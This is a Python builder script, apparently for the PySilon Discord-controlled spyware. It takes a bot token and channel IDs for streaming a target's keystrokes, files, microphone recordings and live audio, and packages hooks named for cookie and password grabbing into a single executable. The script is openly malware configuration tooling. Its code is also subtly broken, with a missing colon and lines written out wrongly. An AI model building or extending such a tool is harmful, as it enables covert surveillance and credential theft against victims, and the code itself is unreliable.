import os
import sys
import hashlib

def get_file_hash(path):
    sha256_hash = hashlib.sha256()
    with open(path,"rb") as f:
        for byte_block in iter(lambda: f.read(16777216),b""):
            sha256_hash.update(byte_block)
        return sha256_hash.hexdigest()


main_channel = input('Main channel ID: ')
spam_channel = input('Spam channel ID: ')
file_channel = input('File channel ID: ')
recordings_channel = input('Recordings channel ID: ')
voice_channel = input('Voice channel ID: ')
bot_token = input('Discord BOT token: ')
software_registry = input('Software registry name (press ENTER if you set this in source code and want to skip this part): ')
software_directory = input('Software directory name (default -> REGISTRY): ')
software_executable = input('Software executable name (default -> DIRECTORY + .exe): ')

pyinstaller_command = 'start cmd /k "title Building file...' + ' '*240 + '& python PyInstaller/__main__.py -F ' + '--runtime-hook=resources/misc.py --runtime-hook=resources/get_cookies.py --runtime-hook=resources/passwords_grabber.py "main.py" & pause & exit"'

with open('PySilon.key', 'wb') as save_key: save_key.write(os.urandom(1024*1024))
with open('main.py', 'r') as copy_source_code: source_code = copy_source_code.readlines()
with open('main.py', 'w') as edit_source_code:
    for line in range(len(source_code)):
        match line:
            case 46:
                edit_source_code.write('bot_token = \'' + str(bot_token) + '\'   # Paste here BOT-token\n')
            case 47:
                if software_registry != '':
                    edit_source_code.write('software_registry_name = \'' + software_registry + '\'   # --- Software name shown in registry\n')
            case 48:
                if software_registry != '':
                    edit_source_code.write('software_directory_name = \'' + software_directory + '\'   # --- Directory (containing software executable) located in "C:\Program Files"\n')
            case 49
                if software_registry != '':
                    edit_source_code.write('software_executable_name = \'' + software_executable + '\'   # --- Software executable name\n')
            case 52:
                edit_source_code.write('    \'main\': ' + main_channel + ',   # Paste here main channel ID for general output\n')
            case 53:
                edit_source_code.write('    \'spam\': ' + spam_channel + ',   # Paste here spam channel ID for filter key spamming (mostly while target play game)\n')
            case 54:
                edit_source_code.write('    \'file\': ' + file_channel + ',   # Paste here file-related channel ID for browsing, downloading and uploading files\n')
            case 55:
                edit_source_code.write('    \'recordings\': ' + recordings_channel + ',   # Paste here recording channel ID for microphone recordings storing\n')
            case 56:
                edit_source_code.write('    \'voice\': ' + voice_channel + '   # Paste here voice channel ID for realtime microphone intercepting\n')
            case 59:
                edit_source_code.write('secret_key = \'' + get_file_hash('PySilon.key') + '\'   # Don\'t touch this line (just leave)\n')
            case _:
                edit_source_code.write(line)

#os.system(pyinstaller_command)
input('Done')
